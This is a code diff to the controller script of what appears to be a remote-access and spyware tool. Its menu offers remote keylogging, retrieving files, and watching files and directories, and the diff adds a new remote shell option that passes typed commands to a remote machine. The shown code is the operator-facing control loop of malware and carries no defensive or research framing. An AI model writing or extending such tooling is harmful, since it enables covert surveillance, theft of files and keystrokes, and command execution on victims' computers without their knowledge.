@@ -71,6 +71,8 @@ def decrypt_response():
     with open("rawdata.txt", "rb") as file:
         data = file.read()
 
+    # print(data)
+
     # Strip EOF marker and decrypt
     data_split = data.split(b"$EOF")
     decrypted = encryption.decrypt_data(data_split[0])
@@ -120,7 +122,7 @@ def main():
         process.start()
 
     print("Select option (e.g., 1 for keylogging). Enter 'q' to quit:\n")
-    print("[1] Remote keylogging\n[2] Get file\n[3] Watch a file\n[4] Watch a directory\n[q] Quit")
+    print("[1] Remote keylogging\n[2] Get file\n[3] Watch a file\n[4] Watch a directory\n[5] Remote shell\n[q] Quit")
 
     global is_running
 
@@ -176,6 +178,20 @@ def main():
                 print("[Watch a directory] Stopped")
                 is_running = False
                 init_func("watchdir")
+            # break
+
+        # Remote shell
+        elif option == "5":
+            if is_running == False:
+                print("[Remote shell] Started")
+                is_running = True
+
+                command = input("Enter command:\n")
+                init_func("rshell", command)
+            else:
+                print("[Remote shell] Stopped")
+                is_running = False
+                init_func("rshell")
             # break
 
         # Quit
